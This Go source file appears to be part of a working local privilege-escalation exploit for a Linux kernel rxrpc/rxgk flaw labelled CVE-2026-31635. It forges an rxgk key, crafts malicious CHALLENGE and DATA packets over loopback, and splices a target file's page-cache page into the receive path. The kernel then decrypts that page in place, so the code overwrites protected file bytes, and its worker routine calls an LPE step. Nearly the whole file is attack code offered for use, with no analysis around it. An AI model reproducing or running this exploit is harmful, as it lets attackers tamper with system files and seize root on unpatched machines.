package main

// rxgk trigger path - CVE-2026-31635
// One AF_RXRPC call per fire: random 16-byte AES key, splice file page into
// the rxrpc receive buffer, rxgk_decrypt_skb() decrypts in-place (no COW).

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	afRxrpc  = 33
	solRxrpc = 272

	rxrpcSecurityKey      = 1
	rxrpcMinSecurityLevel = 4
	rxrpcSecurityEncrypt  = 2
	rxrpcUserCallID       = 1

	rxrpcPacketTypeData      = 1
	rxrpcPacketTypeChallenge = 6
	rxrpcLastPacket          = 0x04

	keySpecProcessKeyring = 0xFFFFFFFE
	keyctlUnlink          = 9

	rxgkSecurityIndex = 6
	enctypeAES128CTS  = 17
	rxgkLevelEncrypt  = 2
)

var triggerSeq int64

type rxrpcWireHeader struct {
	Epoch      uint32
	Cid        uint32
	CallNumber uint32
	Seq        uint32
	Serial     uint32
	Type       uint8
	Flags      uint8
	UserStatus uint8
	SecuIdx    uint8
	Cksum      uint16
	ServiceID  uint16
}

func marshalWireHeader(h rxrpcWireHeader) []byte {
	b := make([]byte, 28)
	binary.BigEndian.PutUint32(b[0:], h.Epoch)
	binary.BigEndian.PutUint32(b[4:], h.Cid)
	binary.BigEndian.PutUint32(b[8:], h.CallNumber)
	binary.BigEndian.PutUint32(b[12:], h.Seq)
	binary.BigEndian.PutUint32(b[16:], h.Serial)
	b[20] = h.Type
	b[21] = h.Flags
	b[22] = h.UserStatus
	b[23] = h.SecuIdx
	binary.BigEndian.PutUint16(b[24:], h.Cksum)
	binary.BigEndian.PutUint16(b[26:], h.ServiceID)
	return b
}

// marshalRxgkChallenge builds the rxgk CHALLENGE body.
// rxgk_validate_challenge reads exactly 20 bytes (skb_copy_bits offset=28 len=20).
// rxgk_issue_challenge writes 20 random bytes - opaque server data, no fixed schema.
func marshalRxgkChallenge(nonce uint32) []byte {
	b := make([]byte, 20)
	binary.BigEndian.PutUint32(b[0:], 1)
	binary.BigEndian.PutUint32(b[4:], rxgkLevelEncrypt)
	binary.BigEndian.PutUint64(b[8:], uint64(nonce))
	// last 4 bytes zero-padded
	return b
}

func sockaddrRxrpcBytes(service, transportType, transportLen, port uint16, addr [4]byte) []byte {
	b := make([]byte, 36)
	binary.LittleEndian.PutUint16(b[0:], afRxrpc)
	binary.LittleEndian.PutUint16(b[2:], service)
	binary.LittleEndian.PutUint16(b[4:], transportType)
	binary.LittleEndian.PutUint16(b[6:], transportLen)
	binary.LittleEndian.PutUint16(b[8:], syscall.AF_INET)
	binary.BigEndian.PutUint16(b[10:], port)
	copy(b[12:], addr[:])
	return b
}

// buildRxgkToken builds an XDR-encoded rxgk authentication token for add_key.
// Layout: flags + cell(XDR) + ntoken + [toklen + sec_ix + times + level +
//         lifetime + bytelife + enctype + key(XDR) + ticket(XDR)]
func buildRxgkToken(key [16]byte) []byte {
	// Time in 100ns units since Unix epoch - matches C PoC: tv_sec*10000000 + tv_nsec/100
	now := time.Now().UnixNano() / 100
	cell := "poc.test"
	clen := len(cell)
	pad := (4 - (clen & 3)) & 3

	var buf []byte
	put32 := func(v uint32) {
		var b [4]byte
		binary.BigEndian.PutUint32(b[:], v)
		buf = append(buf, b[:]...)
	}
	put64 := func(v int64) {
		var b [8]byte
		binary.BigEndian.PutUint64(b[:], uint64(v))
		buf = append(buf, b[:]...)
	}

	put32(0)
	put32(uint32(clen))
	buf = append(buf, []byte(cell)...)
	buf = append(buf, make([]byte, pad)...)
	put32(1)

	tokLenIdx := len(buf)
	put32(0)
	tokStart := len(buf)

	put32(rxgkSecurityIndex)
	put64(now)                 // begintime
	put64(now + 864000000000) // endtime (+86400 seconds in 100ns units)
	put64(2)                  // level (rxgkLevelEncrypt)
	put64(864000000000)       // lifetime: 86400 seconds in 100ns units
	put64(0)                  // bytelife: unlimited
	put64(enctypeAES128CTS)
	put32(16)
	buf = append(buf, key[:]...)
	put32(8)
	buf = append(buf, 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe)

	binary.BigEndian.PutUint32(buf[tokLenIdx:], uint32(len(buf)-tokStart))
	return buf
}

func addRxgkKey(desc string, key [16]byte) (uintptr, error) {
	token := buildRxgkToken(key)
	typ := []byte("rxrpc\x00")
	d := []byte(desc + "\x00")
	r, _, errno := syscall.Syscall6(syscall.SYS_ADD_KEY,
		uintptr(unsafe.Pointer(&typ[0])),
		uintptr(unsafe.Pointer(&d[0])),
		uintptr(unsafe.Pointer(&token[0])),
		uintptr(len(token)),
		uintptr(uint32(keySpecProcessKeyring)),
		0)
	if errno != 0 {
		return 0, errno
	}
	return r, nil
}

func keyctlUnlink_(key uintptr) {
	syscall.Syscall(syscall.SYS_KEYCTL, keyctlUnlink, key, uintptr(uint32(keySpecProcessKeyring))) //nolint:errcheck
}

func setupRxrpcClient(localPort uint16, keyname string) (int, error) {
	fd, _, errno := syscall.Syscall(syscall.SYS_SOCKET, afRxrpc, syscall.SOCK_DGRAM, syscall.AF_INET)
	if errno != 0 {
		return -1, fmt.Errorf("socket(AF_RXRPC): %w", errno)
	}
	s := int(fd)

	kn := []byte(keyname + "\x00")
	_, _, errno = syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(s),
		solRxrpc, rxrpcSecurityKey,
		uintptr(unsafe.Pointer(&kn[0])), uintptr(len(kn)-1), 0)
	if errno != 0 {
		syscall.Close(s)
		return -1, fmt.Errorf("RXRPC_SECURITY_KEY: %w", errno)
	}

	minLevel := int32(rxrpcSecurityEncrypt)
	_, _, errno = syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(s),
		solRxrpc, rxrpcMinSecurityLevel,
		uintptr(unsafe.Pointer(&minLevel)), 4, 0)
	if errno != 0 {
		syscall.Close(s)
		return -1, fmt.Errorf("RXRPC_MIN_SECURITY_LEVEL: %w", errno)
	}

	srx := sockaddrRxrpcBytes(0, syscall.SOCK_DGRAM, 16, localPort, [4]byte{127, 0, 0, 1})
	_, _, errno = syscall.Syscall(syscall.SYS_BIND, uintptr(s),
		uintptr(unsafe.Pointer(&srx[0])), uintptr(len(srx)))
	if errno != 0 {
		syscall.Close(s)
		return -1, fmt.Errorf("rxrpc bind :%d: %w", localPort, errno)
	}
	return s, nil
}

func setupUDPServer(port uint16) (int, error) {
	s, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return -1, err
	}
	syscall.SetsockoptInt(s, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) //nolint:errcheck
	syscall.SetsockoptInt(s, syscall.SOL_SOCKET, unix.SO_REUSEPORT, 1)    //nolint:errcheck
	sa := syscall.SockaddrInet4{Port: int(port), Addr: [4]byte{127, 0, 0, 1}}
	if err := syscall.Bind(s, &sa); err != nil {
		syscall.Close(s)
		return -1, err
	}
	return s, nil
}

func udpRecvWithTimeout(fd int, buf []byte, timeoutMs int) (int, *syscall.SockaddrInet4, error) {
	var pfds [1]unix.PollFd
	pfds[0] = unix.PollFd{Fd: int32(fd), Events: unix.POLLIN}
	n, err := unix.Poll(pfds[:], timeoutMs)
	if err != nil || n <= 0 {
		return 0, nil, fmt.Errorf("poll timeout")
	}
	rn, from, err := syscall.Recvfrom(fd, buf, 0)
	if err != nil {
		return 0, nil, err
	}
	sa, _ := from.(*syscall.SockaddrInet4)
	return rn, sa, nil
}

func rxrpcInitiateCall(cliFd int, srvPort, serviceID uint16) error {
	data := []byte("PING")
	srx := sockaddrRxrpcBytes(serviceID, syscall.SOCK_DGRAM, 16, srvPort, [4]byte{127, 0, 0, 1})

	cmsgData := make([]byte, 8)
	binary.LittleEndian.PutUint64(cmsgData, 0xCAFE)
	cmsgLen := syscall.CmsgLen(len(cmsgData))
	cbuf := make([]byte, cmsgLen)
	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&cbuf[0]))
	hdr.Level = solRxrpc
	hdr.Type = rxrpcUserCallID
	hdr.SetLen(cmsgLen)
	copy(cbuf[syscall.SizeofCmsghdr:], cmsgData)

	iov := syscall.Iovec{Base: &data[0], Len: uint64(len(data))}
	msg := syscall.Msghdr{
		Name:       &srx[0],
		Namelen:    uint32(len(srx)),
		Iov:        &iov,
		Iovlen:     1,
		Control:    &cbuf[0],
		Controllen: uint64(len(cbuf)),
	}

	fl, _ := unix.FcntlInt(uintptr(cliFd), syscall.F_GETFL, 0)
	unix.FcntlInt(uintptr(cliFd), syscall.F_SETFL, fl|syscall.O_NONBLOCK) //nolint:errcheck
	_, _, errno := syscall.Syscall(syscall.SYS_SENDMSG, uintptr(cliFd),
		uintptr(unsafe.Pointer(&msg)), 0)
	unix.FcntlInt(uintptr(cliFd), syscall.F_SETFL, fl) //nolint:errcheck
	if errno != 0 && errno != syscall.EAGAIN {
		return fmt.Errorf("rxrpc sendmsg: %w", errno)
	}
	return nil
}

// fire performs one rxgk decrypt trigger at fileOff in targetFd.
// A random 16-byte AES key is used; byte 0 of the AES-CBC-decrypted block
// written back to page_cache[fileOff] is uniformly random (1/256 success).
func fire(targetFd int, fileOff int64) error {
	seq := atomic.AddInt64(&triggerSeq, 1)
	keyname := fmt.Sprintf("dd%d", seq)

	var key [16]byte
	if _, err := rand.Read(key[:]); err != nil {
		return fmt.Errorf("rand: %w", err)
	}
	keyID, err := addRxgkKey(keyname, key)
	if err != nil {
		return fmt.Errorf("add_key: %w", err)
	}
	defer keyctlUnlink_(keyID)

	portS := uint16(12000 + (seq%400)*2)
	portC := portS + 1
	svcID := uint16(0x1234)

	udpSrv, err := setupUDPServer(portS)
	if err != nil {
		return fmt.Errorf("udp :%d: %w", portS, err)
	}
	defer syscall.Close(udpSrv)

	rxCli, err := setupRxrpcClient(portC, keyname)
	if err != nil {
		return fmt.Errorf("rxrpc :%d: %w", portC, err)
	}
	defer syscall.Close(rxCli)

	if err := rxrpcInitiateCall(rxCli, portS, svcID); err != nil {
		return err
	}

	pkt := make([]byte, 2048)
	n, cliSA, err := udpRecvWithTimeout(udpSrv, pkt, 1500)
	if err != nil || n < 28 {
		return fmt.Errorf("recv CONNECT: n=%d %v", n, err)
	}

	epoch := binary.BigEndian.Uint32(pkt[0:])
	cid := binary.BigEndian.Uint32(pkt[4:])
	callN := binary.BigEndian.Uint32(pkt[8:])
	svcIn := binary.BigEndian.Uint16(pkt[26:])
	cliPort := uint16(cliSA.Port)

	chHdr := rxrpcWireHeader{
		Epoch: epoch, Cid: cid,
		Serial: uint32(seq) << 16, Type: rxrpcPacketTypeChallenge,
		SecuIdx: rxgkSecurityIndex, ServiceID: svcIn,
	}
	ch := append(marshalWireHeader(chHdr), marshalRxgkChallenge(0xDEADBEEF)...)
	dstTo := syscall.SockaddrInet4{Port: int(cliPort), Addr: [4]byte{127, 0, 0, 1}}
	syscall.Sendto(udpSrv, ch, 0, &dstTo) //nolint:errcheck

	for i := 0; i < 3; i++ {
		udpRecvWithTimeout(udpSrv, pkt, 5) //nolint:errcheck
	}

	// Craft DATA packet: SecuIdx=6, cksum=1 (bug triggers before HMAC check)
	malHdr := rxrpcWireHeader{
		Epoch: epoch, Cid: cid, CallNumber: callN,
		Seq: 1, Serial: uint32(seq)<<16 | 1,
		Type:  rxrpcPacketTypeData, Flags: rxrpcLastPacket,
		SecuIdx: rxgkSecurityIndex, Cksum: 1, ServiceID: svcIn,
	}
	malBytes := marshalWireHeader(malHdr)

	syscall.Connect(udpSrv, &syscall.SockaddrInet4{ //nolint:errcheck
		Port: int(cliPort), Addr: [4]byte{127, 0, 0, 1},
	})

	var p [2]int
	if err := syscall.Pipe(p[:]); err != nil {
		return err
	}
	defer func() { syscall.Close(p[0]); syscall.Close(p[1]) }()

	iov := unix.Iovec{Base: &malBytes[0], Len: uint64(len(malBytes))}
	if _, err := unix.Vmsplice(p[1], []unix.Iovec{iov}, 0); err != nil {
		return fmt.Errorf("vmsplice: %w", err)
	}

	off := fileOff
	if _, err := unix.Splice(targetFd, &off, p[1], nil, rxgkMinPayload, unix.SPLICE_F_NONBLOCK); err != nil {
		return fmt.Errorf("splice file->pipe: %w", err)
	}
	if _, err := unix.Splice(p[0], nil, udpSrv, nil, len(malBytes)+rxgkMinPayload, 0); err != nil {
		return fmt.Errorf("splice pipe->udp: %w", err)
	}

	// Non-blocking recvmsg drives the kernel's rxgk_verify_packet path.
	fl, _ := unix.FcntlInt(uintptr(rxCli), syscall.F_GETFL, 0)
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl|syscall.O_NONBLOCK) //nolint:errcheck
	recvBuf := make([]byte, 2048)
	for round := 0; round < 5; round++ {
		n, _, err := syscall.Recvfrom(rxCli, recvBuf, 0)
		if n > 0 || err != syscall.EAGAIN {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl) //nolint:errcheck
	return nil
}

func bringUpLoopback() error {
	s, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return fmt.Errorf("socket: %w", err)
	}
	defer syscall.Close(s)

	var ifr [unix.IFNAMSIZ + 64]byte
	copy(ifr[:], "lo")
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(s),
		unix.SIOCGIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))); errno != 0 {
		return fmt.Errorf("SIOCGIFFLAGS: %w", errno)
	}
	flags := binary.LittleEndian.Uint16(ifr[unix.IFNAMSIZ:])
	flags |= unix.IFF_UP | unix.IFF_RUNNING
	binary.LittleEndian.PutUint16(ifr[unix.IFNAMSIZ:], flags)
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(s),
		unix.SIOCSIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))); errno != 0 {
		return fmt.Errorf("SIOCSIFFLAGS: %w", errno)
	}
	return nil
}

func runWorker() {
	if err := bringUpLoopback(); err != nil {
		fmt.Fprintln(os.Stderr, "[!] loopback:", err)
		os.Exit(2)
	}
	time.Sleep(50 * time.Millisecond)

	// autoload rxrpc module
	dummy, _, errno := syscall.Syscall(syscall.SYS_SOCKET, afRxrpc, syscall.SOCK_DGRAM, syscall.AF_INET)
	if errno != 0 {
		fmt.Fprintf(os.Stderr, "[!] socket(AF_RXRPC): %v - module unavailable\n", errno)
		os.Exit(2)
	}
	syscall.Close(int(dummy))
	fmt.Fprintln(os.Stderr, "[+] rxrpc module ready")

	if err := dirtydecryptLPE(); err != nil {
		fmt.Fprintln(os.Stderr, "[!] LPE:", err)
		os.Exit(2)
	}
	os.Exit(0)
}
